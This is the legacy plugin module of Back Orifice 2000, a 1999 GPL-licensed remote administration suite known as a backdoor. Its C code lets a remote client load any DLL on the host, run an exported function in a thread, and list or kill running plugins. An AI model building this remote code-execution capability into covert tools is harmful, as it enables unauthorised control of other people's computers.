/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// Legacy Buttplug Support

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<cmd\cmd_plugin.h>
#include<strhandle.h>

#define MAX_BUTTPLUGS 16

// -------------------- Global Variables --------------------------

#pragma pack(push,1)

typedef char * (__stdcall *PBUTTPLUG_FUNC)(int *active, char *args);

typedef struct {
	BOOL bActive;
	HMODULE hDll;
	PBUTTPLUG_FUNC proc;
	HANDLE hPluginThread;
	char svCmdStr[MAX_PATH+256];
	char svArgs[512];
	char svRetStr[1024];
} BUTTPLUG_INFO;


#pragma pack(pop)

BUTTPLUG_INFO *g_pButtArray=NULL;

// ---------------------- Implementation ---------------------------

int Cmd_Buttplugs_Init(void)
{
	g_pButtArray=(BUTTPLUG_INFO *)malloc(sizeof(BUTTPLUG_INFO)*MAX_BUTTPLUGS);
	if(g_pButtArray==NULL) return -1;

	memset(g_pButtArray,0,sizeof(BUTTPLUG_INFO)*MAX_BUTTPLUGS);
	
	return 0;
}

int Cmd_Buttplugs_Kill(void)
{
	free(g_pButtArray);
	g_pButtArray=NULL;
	
	return 0;
}

DWORD WINAPI PluginThread(LPVOID pArgs)
{
	BUTTPLUG_INFO *pInfo=(BUTTPLUG_INFO *)pArgs;
	char *svRet;
	
	pInfo->bActive=TRUE;
	svRet=(pInfo->proc)(&(pInfo->bActive),pInfo->svArgs);
	lstrcpyn(pInfo->svRetStr,svRet,1024);
	
	FreeLibrary(pInfo->hDll);
	pInfo->bActive=FALSE;
	
	return 0;
}


int CmdProc_PluginExecute(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	// Find open slot
	int s;
	for(s=0;s<MAX_BUTTPLUGS;s++) {
		if(g_pButtArray[s].bActive==FALSE) break;
	}
	if(s==MAX_BUTTPLUGS) {
		IssueAuthCommandReply(cas_from,comid,0,"Too many modules loaded.\n");
		return -1;
	}
	
	// Fill in structure
	
	lstrcpyn(g_pButtArray[s].svCmdStr,svArg2,MAX_PATH+256);
	lstrcpyn(g_pButtArray[s].svArgs,svArg3,512);
	g_pButtArray[s].svRetStr[0]='\0';

	HMODULE hDll;
	char *svDll,*svFunc;
	char svFuncName[256];
	svDll=svArg2;
	svFunc=BreakString(svDll,"::");
	wsprintf(svFuncName,"_%.200s@8",svFunc);

	hDll=LoadLibrary(svDll);
	if(hDll==NULL) {
		IssueAuthCommandReply(cas_from, comid, 0, "Couldn't load module.\n");
		return -1;
	}

	FARPROC proc;
	proc=GetProcAddress(hDll,svFuncName);
	if(proc==NULL) {
		IssueAuthCommandReply(cas_from, comid, 0, "Module function could not be found.\n");
		FreeLibrary(hDll);
		return -1;
	}

	g_pButtArray[s].hDll=hDll;
	g_pButtArray[s].proc=(PBUTTPLUG_FUNC)proc;

	DWORD dwTid;
	g_pButtArray[s].hPluginThread=CreateThread(NULL,0,PluginThread,g_pButtArray+s,0,&dwTid);
	if(g_pButtArray[s].hPluginThread==NULL) {
		IssueAuthCommandReply(cas_from, comid, 0, "Couldn't create thread.\n");
		g_pButtArray[s].proc=NULL;
		FreeLibrary(hDll);
		return -1;
	}
	
	Sleep(1000);
	if(WaitForSingleObject(g_pButtArray[s].hPluginThread,0)==WAIT_OBJECT_0) {
		IssueAuthCommandReply(cas_from, comid, 1, "Plugin function returned quickly:\n");
		IssueAuthCommandReply(cas_from, comid, 0, g_pButtArray[s].svRetStr);	
		g_pButtArray[s].proc=NULL;
		return 0;	
	}
	
	IssueAuthCommandReply(cas_from, comid, 0, "Plugin started. Use 'Plugin List' to get return value.\n");
	return 0;
}

int CmdProc_PluginList(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	IssueAuthCommandReply(cas_from, comid, 1, "Legacy plugins list\n-------------------\n");

	// List plugins
	int s;
	for(s=0;s<MAX_BUTTPLUGS;s++) {
		char svLine[1024];
		if(g_pButtArray[s].bActive) {
			wsprintf(svLine,"%2d: %s (RUNNING)\n",s,g_pButtArray[s].svCmdStr);
			IssueAuthCommandReply(cas_from, comid, 1, svLine);
		} else {
			if(g_pButtArray[s].proc!=NULL) {
				wsprintf(svLine,"%2d: %256s Returned: %256s\n",s,g_pButtArray[s].svCmdStr, g_pButtArray[s].svRetStr);
				IssueAuthCommandReply(cas_from, comid, 1, svLine);
			}
		}
	}

	// End of plugins list
	IssueAuthCommandReply(cas_from, comid, 0, "End of plugins list.\n");

	return 0;
}

int CmdProc_PluginKill(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(nArg1<0 || nArg1>=MAX_BUTTPLUGS) {
		IssueAuthCommandReply(cas_from, comid, 0, "Plugin # out of range.\n");
		return -1;
	}
	if(g_pButtArray[nArg1].bActive==FALSE) {
		IssueAuthCommandReply(cas_from, comid, 0, "Plugin in not active.\n");
		return -1;
	}
	g_pButtArray[nArg1].bActive=FALSE;
	if(WaitForSingleObject(g_pButtArray[nArg1].hPluginThread,5000)!=WAIT_OBJECT_0) {
		IssueAuthCommandReply(cas_from, comid, 0, "Plugin would not stop in 5 seconds.\n");
		return -1;
	}

	char svLine[1024];
	wsprintf(svLine,"%2d: %256s Returned: %256s\n",nArg1,g_pButtArray[nArg1].svCmdStr, g_pButtArray[nArg1].svRetStr);
	IssueAuthCommandReply(cas_from, comid, 0, svLine);
	return 0;
}

